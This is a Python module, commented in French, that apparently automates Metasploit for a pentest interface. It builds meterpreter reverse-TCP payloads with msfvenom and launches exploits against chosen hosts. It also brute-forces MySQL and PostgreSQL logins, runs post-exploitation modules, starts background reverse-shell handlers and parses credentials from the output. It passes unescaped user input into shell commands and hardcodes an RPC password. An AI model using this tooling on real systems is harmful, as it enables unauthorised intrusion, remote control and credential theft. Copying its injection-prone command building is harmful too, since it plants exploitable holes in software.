"""
Module Metasploit Integration
Intégration avec Metasploit Framework via msfrpc
"""
import json
import asyncio
import subprocess
from typing import Dict, Any, List, Optional
from datetime import datetime
import socket
import time

from core.executor import CommandExecutor, escape_shell_arg
from core.config import settings


class MetasploitModule:
    """
    Module d'intégration Metasploit
    
    Modes de fonctionnement:
    1. Direct CLI: Exécute msfconsole avec resource scripts
    2. API RPC: Utilise msfrpcd pour une intégration plus poussée
    """
    
    def __init__(self):
        self.executor = CommandExecutor()
        self.msf_host = "127.0.0.1"
        self.msf_port = 55553
        self.msf_user = "msf"
        self.msf_pass = "hackinterface"
        self.rpc_client = None
    
    # =========================================================================
    # MSFVENOM - Génération de Payloads
    # =========================================================================
    
    async def generate_payload(self, options: Dict[str, Any]) -> Dict[str, Any]:
        """
        Générer un payload avec msfvenom
        """
        payload = options.get("payload", "windows/x64/meterpreter/reverse_tcp")
        lhost = options.get("lhost", "")
        lport = options.get("lport", "4444")
        format_type = options.get("format", "exe")
        encoder = options.get("encoder", "")
        iterations = options.get("iterations", 1)
        output_file = options.get("output", f"/tmp/payload_{int(time.time())}.{format_type}")
        
        if not lhost:
            return {
                "action": "msfvenom",
                "status": "error",
                "error": "LHOST est requis",
                "timestamp": datetime.now().isoformat()
            }
        
        cmd_parts = [
            "msfvenom",
            f"-p {payload}",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            f"-f {format_type}",
        ]
        
        if encoder:
            cmd_parts.append(f"-e {encoder}")
            cmd_parts.append(f"-i {iterations}")
        
        cmd_parts.append(f"-o {output_file}")
        cmd = " ".join(cmd_parts)
        
        result = await self.executor.run(cmd, timeout=120)
        
        return {
            "action": "msfvenom",
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "payload": payload,
                "lhost": lhost,
                "lport": lport,
                "format": format_type,
                "output_file": output_file if result.return_code == 0 else None
            }
        }
    
    async def list_payloads(self, filter_str: str = "") -> Dict[str, Any]:
        """
        Lister les payloads disponibles
        """
        cmd = f"msfvenom -l payloads"
        if filter_str:
            cmd += f" | grep -i '{filter_str}'"
        
        result = await self.executor.run(cmd, timeout=60)
        
        payloads = []
        for line in result.stdout.split('\n'):
            if '/' in line and not line.startswith('=') and not line.startswith('Name'):
                parts = line.strip().split()
                if parts:
                    payloads.append({
                        "name": parts[0],
                        "description": ' '.join(parts[1:]) if len(parts) > 1 else ""
                    })
        
        return {
            "action": "list_payloads",
            "status": "completed",
            "output": result.stdout,
            "parsed_data": {
                "payloads": payloads[:100],  # Limiter
                "count": len(payloads)
            }
        }
    
    # =========================================================================
    # EXPLOITS - Exécution via Resource Scripts
    # =========================================================================
    
    async def run_exploit(self, options: Dict[str, Any]) -> Dict[str, Any]:
        """
        Exécuter un exploit Metasploit via resource script
        """
        exploit = options.get("exploit", "")
        rhosts = options.get("rhosts", "")
        rport = options.get("rport", "")
        payload = options.get("payload", "")
        lhost = options.get("lhost", "")
        lport = options.get("lport", "4444")
        extra_options = options.get("extra_options", {})
        
        if not exploit or not rhosts:
            return {
                "action": "msf_exploit",
                "status": "error",
                "error": "exploit et rhosts sont requis",
                "timestamp": datetime.now().isoformat()
            }
        
        # Créer le resource script
        rc_content = f"""
use {exploit}
set RHOSTS {rhosts}
"""
        if rport:
            rc_content += f"set RPORT {rport}\n"
        if payload:
            rc_content += f"set PAYLOAD {payload}\n"
        if lhost:
            rc_content += f"set LHOST {lhost}\n"
        if lport:
            rc_content += f"set LPORT {lport}\n"
        
        for key, value in extra_options.items():
            rc_content += f"set {key} {value}\n"
        
        rc_content += """
run
exit
"""
        
        rc_file = f"/tmp/msf_exploit_{int(time.time())}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        cmd = f"msfconsole -q -r {rc_file}"
        
        result = await self.executor.run(cmd, timeout=600)
        
        # Parser les résultats
        parsed = self._parse_msf_output(result.stdout)
        
        return {
            "action": "msf_exploit",
            "target": rhosts,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd,
            "resource_script": rc_content,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": parsed
        }
    
    async def check_exploit(self, exploit: str, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Vérifier si une cible est vulnérable (sans exploitation)
        """
        options = options or {}
        
        rc_content = f"""
use {exploit}
set RHOSTS {target}
"""
        for key, value in options.items():
            rc_content += f"set {key} {value}\n"
        
        rc_content += """
check
exit
"""
        
        rc_file = f"/tmp/msf_check_{int(time.time())}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        cmd = f"msfconsole -q -r {rc_file}"
        
        result = await self.executor.run(cmd, timeout=120)
        
        # Déterminer le résultat du check
        vulnerable = False
        check_result = "unknown"
        
        output_lower = result.stdout.lower()
        if "is vulnerable" in output_lower or "appears to be vulnerable" in output_lower:
            vulnerable = True
            check_result = "vulnerable"
        elif "is not vulnerable" in output_lower or "safe" in output_lower:
            check_result = "not_vulnerable"
        elif "cannot reliably check" in output_lower:
            check_result = "cannot_check"
        
        return {
            "action": "msf_check",
            "target": target,
            "exploit": exploit,
            "status": "completed",
            "vulnerable": vulnerable,
            "check_result": check_result,
            "output": result.stdout,
            "duration": result.duration,
            "timestamp": result.timestamp
        }
    
    async def search_exploits(self, query: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Rechercher des exploits dans Metasploit
        """
        options = options or {}
        
        search_type = options.get("type", "")  # exploit, auxiliary, post
        platform = options.get("platform", "")
        
        search_query = query
        if search_type:
            search_query += f" type:{search_type}"
        if platform:
            search_query += f" platform:{platform}"
        
        rc_content = f"""
search {search_query}
exit
"""
        
        rc_file = f"/tmp/msf_search_{int(time.time())}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        cmd = f"msfconsole -q -r {rc_file}"
        
        result = await self.executor.run(cmd, timeout=60)
        
        # Parser les résultats de recherche
        exploits = self._parse_search_results(result.stdout)
        
        return {
            "action": "msf_search",
            "query": search_query,
            "status": "completed",
            "output": result.stdout,
            "parsed_data": {
                "exploits": exploits,
                "count": len(exploits)
            }
        }
    
    # =========================================================================
    # MODULES AUXILIAIRES
    # =========================================================================
    
    async def run_auxiliary(self, module: str, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécuter un module auxiliaire
        """
        options = options or {}
        
        rc_content = f"""
use {module}
set RHOSTS {target}
"""
        for key, value in options.items():
            rc_content += f"set {key} {value}\n"
        
        rc_content += """
run
exit
"""
        
        rc_file = f"/tmp/msf_aux_{int(time.time())}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        cmd = f"msfconsole -q -r {rc_file}"
        
        result = await self.executor.run(cmd, timeout=300)
        
        parsed = self._parse_msf_output(result.stdout)
        
        return {
            "action": "msf_auxiliary",
            "module": module,
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": parsed
        }
    
    # =========================================================================
    # SCANS SPÉCIFIQUES COURANTS
    # =========================================================================
    
    async def smb_ms17_010(self, target: str) -> Dict[str, Any]:
        """
        Vérifier la vulnérabilité EternalBlue (MS17-010)
        """
        return await self.run_auxiliary(
            "auxiliary/scanner/smb/smb_ms17_010",
            target
        )
    
    async def smb_version(self, target: str) -> Dict[str, Any]:
        """
        Scanner les versions SMB
        """
        return await self.run_auxiliary(
            "auxiliary/scanner/smb/smb_version",
            target
        )
    
    async def ssh_version(self, target: str) -> Dict[str, Any]:
        """
        Scanner les versions SSH
        """
        return await self.run_auxiliary(
            "auxiliary/scanner/ssh/ssh_version",
            target
        )
    
    async def ftp_version(self, target: str) -> Dict[str, Any]:
        """
        Scanner les versions FTP
        """
        return await self.run_auxiliary(
            "auxiliary/scanner/ftp/ftp_version",
            target
        )
    
    async def http_version(self, target: str) -> Dict[str, Any]:
        """
        Scanner les serveurs web
        """
        return await self.run_auxiliary(
            "auxiliary/scanner/http/http_version",
            target
        )
    
    async def mysql_login(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Tester les identifiants MySQL
        """
        options = options or {}
        options.setdefault("USER_FILE", "/usr/share/metasploit-framework/data/wordlists/unix_users.txt")
        options.setdefault("PASS_FILE", "/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt")
        
        return await self.run_auxiliary(
            "auxiliary/scanner/mysql/mysql_login",
            target,
            options
        )
    
    async def postgres_login(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Tester les identifiants PostgreSQL
        """
        options = options or {}
        options.setdefault("USERNAME", "postgres")
        
        return await self.run_auxiliary(
            "auxiliary/scanner/postgres/postgres_login",
            target,
            options
        )
    
    # =========================================================================
    # POST-EXPLOITATION
    # =========================================================================
    
    async def run_post_module(self, module: str, session_id: int, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécuter un module post-exploitation
        """
        options = options or {}
        
        rc_content = f"""
use {module}
set SESSION {session_id}
"""
        for key, value in options.items():
            rc_content += f"set {key} {value}\n"
        
        rc_content += """
run
exit
"""
        
        rc_file = f"/tmp/msf_post_{int(time.time())}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        cmd = f"msfconsole -q -r {rc_file}"
        
        result = await self.executor.run(cmd, timeout=300)
        
        return {
            "action": "msf_post",
            "module": module,
            "session": session_id,
            "status": "completed" if result.return_code == 0 else "error",
            "output": result.stdout,
            "duration": result.duration,
            "timestamp": result.timestamp
        }
    
    # =========================================================================
    # HANDLERS
    # =========================================================================
    
    async def start_handler(self, options: Dict[str, Any]) -> Dict[str, Any]:
        """
        Démarrer un handler pour recevoir des connexions reverse
        Note: Cette fonction démarre en arrière-plan
        """
        payload = options.get("payload", "windows/x64/meterpreter/reverse_tcp")
        lhost = options.get("lhost", "0.0.0.0")
        lport = options.get("lport", "4444")
        
        rc_content = f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
        
        rc_file = f"/tmp/msf_handler_{int(time.time())}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        # Démarrer en arrière-plan
        cmd = f"screen -dmS msf_handler msfconsole -q -r {rc_file}"
        
        result = await self.executor.run(cmd, timeout=30)
        
        return {
            "action": "msf_handler",
            "status": "started" if result.return_code == 0 else "error",
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
            "message": f"Handler démarré en arrière-plan (screen -r msf_handler)",
            "command": f"msfconsole -r {rc_file}",
            "timestamp": datetime.now().isoformat()
        }
    
    # =========================================================================
    # UTILITAIRES
    # =========================================================================
    
    def _parse_msf_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de msfconsole"""
        result = {
            "sessions": [],
            "credentials": [],
            "hosts": [],
            "vulnerabilities": [],
            "success": False
        }
        
        # Chercher les sessions
        if "session" in output.lower() and "opened" in output.lower():
            result["success"] = True
        
        # Chercher les credentials
        import re
        cred_pattern = r'(\S+):(\S+)@(\S+)'
        creds = re.findall(cred_pattern, output)
        for cred in creds:
            result["credentials"].append({
                "user": cred[0],
                "pass": cred[1],
                "host": cred[2]
            })
        
        # Chercher les vulnérabilités
        if "is vulnerable" in output.lower():
            result["vulnerabilities"].append("Target appears vulnerable")
        
        return result
    
    def _parse_search_results(self, output: str) -> List[Dict[str, Any]]:
        """Parse les résultats de recherche MSF"""
        exploits = []
        
        for line in output.split('\n'):
            # Format: # Name Disclosure Date Rank Check Description
            if line.strip() and not line.startswith('=') and not line.startswith('#'):
                parts = line.split()
                if len(parts) >= 4 and '/' in parts[0]:
                    exploits.append({
                        "name": parts[0],
                        "date": parts[1] if len(parts) > 1 else "",
                        "rank": parts[2] if len(parts) > 2 else "",
                        "check": parts[3] if len(parts) > 3 else "",
                        "description": ' '.join(parts[4:]) if len(parts) > 4 else ""
                    })
        
        return exploits[:50]  # Limiter
